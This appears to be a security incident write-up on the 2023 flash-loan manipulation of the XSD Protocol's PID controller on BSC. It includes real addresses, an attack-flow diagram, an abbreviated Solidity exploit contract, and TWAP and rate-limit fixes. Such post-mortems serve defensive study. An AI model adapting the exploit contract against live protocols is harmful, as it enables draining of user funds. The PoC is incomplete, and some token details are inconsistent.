# XSDWETHpool PID Controller Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | XSDWETHpool (XSD Protocol) |
| Date | 2023-09-20 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~56.9 BNB |
| Attack Type | Flash Loan + PID Controller Manipulation |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | `0x506eebd8d6061202a8e8fc600bb3d5d41f475ee1` |
| Attack Contract | `0x202e059a16d29a2f6ae0307ae3d574746b2b6305` |
| Vulnerable Contract | `0xfadda925e10d07430f5d7461689fd90d3d81bb48` (XSDWETHpool) |
| Fork Block | 32,086,900 |

## 2. Vulnerable Code Analysis

XSD Protocol is an algorithmic stablecoin that maintained price stability through a PID (Proportional-Integral-Derivative) controller. `PIDController.systemCalculations()` is externally callable and adjusted XSD supply based on the spot price. By manipulating the pool price with a flash loan and then calling this function, the system responded to a false price signal and minted additional XSD.

```solidity
// Vulnerable pattern: spot-price-based PID controller
contract PIDController {
    IXSDWETHpool public xsdWethPool;

    // Vulnerable: callable by anyone, uses spot price
    function systemCalculations() external {
        // Query the pool's current spot price (manipulable)
        uint256 xsdPrice = xsdWethPool.getXSDPrice();

        if (xsdPrice < targetPrice) {
            // If XSD price is low, mint more (contraction measure)
            // Vulnerable: manipulated low price triggers excessive XSD minting
            uint256 mintAmount = calculateMintAmount(xsdPrice);
            XSD.mint(address(this), mintAmount);
        }
    }
}

contract XSDWETHpool {
    // Vulnerable: returns spot price immediately
    function getXSDPrice() external view returns (uint256) {
        (uint256 xsdReserve, uint256 wethReserve,) = getReserves();
        return wethReserve * 1e18 / xsdReserve; // manipulable
    }
}
```

**Vulnerability**: `PIDController.systemCalculations()` is publicly callable and uses the spot price from XSDWETHpool. By injecting a large amount of XSD into the pool via flash loan to suppress the price and then calling `systemCalculations()`, the system perceives the XSD price as having dropped and mints additional BankX tokens. Additional profit is then realized through the XSD Router.

### On-chain Source Code

Source: Bytecode decompiled

```solidity
// File: XSDWETHpool_decompiled.sol
    function setPIDController(address account, uint256 value) external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0x506eebd8d6061202a8e8fc600bb3d5d41f475ee1]
  │
  ├─1─▶ DPPOracle.flashLoan()
  │      First flash loan
  │
  ├─2─▶ DPPAdvance.flashLoan()
  │      Second chained flash loan
  │      [WBNB: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
  │      [XSD: 0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6]
  │
  ├─3─▶ Router.swapXSDForETH()
  │      XSD → ETH swap to manipulate pool price
  │      Artificially depresses XSD price
  │
  ├─4─▶ XSDWETHpool.swap()
  │      [XSDWETHpool: 0xfadda925e10d07430f5d7461689fd90d3d81bb48]
  │      Additional price manipulation
  │
  ├─5─▶ PIDController.systemCalculations()
  │      Perceives manipulated low XSD price
  │      → Triggers excessive BankX/XSD minting
  │
  ├─6─▶ Router.swapETHForBankX()
  │      Sells minted BankX
  │
  └─7─▶ Repay flash loans + realize ~56.9 BNB profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IXSDRouter {
    function swapXSDForETH(uint256 xsdAmount, uint256 minEth) external;
    function swapETHForBankX(uint256 minBankX) external payable;
}

interface IXSDWETHpool {
    function swap(uint256 xsdOut, uint256 wethOut, address to) external;
}

interface IPIDController {
    function systemCalculations() external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract XSDExploit {
    IXSDRouter router;
    IXSDWETHpool xsdWethPool = IXSDWETHpool(0xfadda925e10d07430f5d7461689fd90d3d81bb48);
    IPIDController pidController;
    IXSD XSD = IXSD(0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6);
    IWBNB WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDPPOracle dppOracle;
    IDPPAdvanced dppAdvanced;

    function testExploit() external {
        dppOracle.flashLoan(
            WBNB.balanceOf(address(dppOracle)) * 99 / 100,
            0,
            address(this),
            "xsd1"
        );
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("xsd1")) {
            // Chained flash loan
            dppAdvanced.flashLoan(
                WBNB.balanceOf(address(dppAdvanced)) * 99/100,
                0,
                address(this),
                "xsd2"
            );
            WBNB.transfer(address(dppOracle), baseAmount);
        } else {
            // XSD price manipulation
            router.swapXSDForETH(XSD.balanceOf(address(this)), 0);
            xsdWethPool.swap(0, WBNB.balanceOf(address(xsdWethPool)) * 9/10, address(this));

            // Trigger PID controller — reacts to false price
            pidController.systemCalculations();

            // Sell BankX
            router.swapETHForBankX{value: address(this).balance}(0);

            WBNB.transfer(address(dppAdvanced), baseAmount);
        }
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | Spot-price-based PID controller manipulation |
| Impact Scope | Entire XSD Protocol |
| Explorer | [BSCscan](https://bscscan.com/address/0xfadda925e10d07430f5d7461689fd90d3d81bb48) |

## 6. Security Recommendations

```solidity
// Fix 1: Use TWAP-based price
contract PIDController {
    uint256 public constant TWAP_PERIOD = 30 minutes;

    function getXSDTWAP() internal view returns (uint256) {
        // Uniswap V3 TWAP
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = uint32(TWAP_PERIOD);
        secondsAgos[1] = 0;
        (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);
        int56 tickDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 avgTick = int24(tickDelta / int56(int32(TWAP_PERIOD)));
        return TickMath.getSqrtRatioAtTick(avgTick);
    }

    function systemCalculations() external {
        uint256 xsdPrice = getXSDTWAP(); // Use TWAP instead of spot price
        // ...
    }
}

// Fix 2: Rate-limit systemCalculations calls
uint256 public lastSystemCalc;
uint256 public constant MIN_CALC_INTERVAL = 1 hours;

function systemCalculations() external {
    require(block.timestamp >= lastSystemCalc + MIN_CALC_INTERVAL, "Too frequent");
    lastSystemCalc = block.timestamp;
    // ...
}

// Fix 3: Anomaly detection via price deviation threshold
function systemCalculations() external {
    uint256 currentPrice = getXSDPrice();
    uint256 lastPrice = lastRecordedPrice;

    // Halt if price changes more than 5% in a single block
    require(
        currentPrice <= lastPrice * 105 / 100 &&
        currentPrice >= lastPrice * 95 / 100,
        "Abnormal price movement detected"
    );
    lastRecordedPrice = currentPrice;
    // ...
}
```

## 7. Lessons Learned

1. **Algorithmic Stablecoin PID Vulnerability**: When a PID controller uses a manipulable spot price as its input, flash loan attackers can mislead the system's response and trigger incorrect token minting.
2. **Public `systemCalculations()` Call**: If a protocol's core mechanism (price stabilization function) is callable by anyone, an attacker can trigger it at an opportune moment. Call-rate limiting or access control is required.
3. **Fragility of Algorithmic Stablecoins**: Algorithmic stablecoins depend absolutely on their price feeds and are therefore highly vulnerable to oracle manipulation. Without TWAP or multi-oracle setups, they are fully exposed to flash loan attacks.
4. **Cascading Vulnerabilities in Small BSC DeFi**: Small-to-mid-sized algorithmic stablecoin protocols on BSC are repeatedly exploited due to their use of unaudited PID mechanisms.